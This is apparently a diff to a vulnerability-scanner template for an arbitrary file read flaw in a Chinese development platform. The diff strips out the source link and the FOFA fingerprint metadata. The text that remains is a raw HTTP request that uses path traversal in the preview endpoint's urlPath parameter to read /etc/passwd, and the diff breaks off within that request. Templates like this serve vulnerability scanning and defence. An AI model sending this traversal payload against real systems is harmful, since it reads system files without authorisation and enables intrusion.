@@ -3,12 +3,8 @@ info:
   name: 真内控国产化开发平台 preview 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hg9sftozcfrdol80'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hg9sftozcfrdol80
-    fofa: body="js/npm.echarts.js"
 http:
 - raw:
   - 'GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
